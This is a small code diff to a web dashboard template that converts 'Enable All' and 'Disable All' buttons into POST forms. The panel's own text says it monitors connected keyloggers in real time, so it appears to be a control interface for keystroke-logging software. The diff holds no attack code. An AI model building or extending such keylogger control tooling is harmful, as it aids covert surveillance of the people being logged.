@@ -136,8 +136,12 @@
     Monitor connected keyloggers and their statuses in real-time.
   </p>
   <div class="btn-group">
-    <button class="btn btn-success" onclick="sendStatus('enabled')">Enable All</button>
-    <button class="btn btn-destructive" onclick="sendStatus('disabled')">Disable All</button>
+    <form method="post" action="{{ url_for('enable_all_route') }}">
+      <button type="submit" class="btn btn-success">Enable All</button>
+    </form>
+    <form method="post" action="{{ url_for('disable_all_route') }}">
+      <button type="submit" class="btn btn-destructive">Disable All</button>
+    </form>
   </div>
 </div>
 
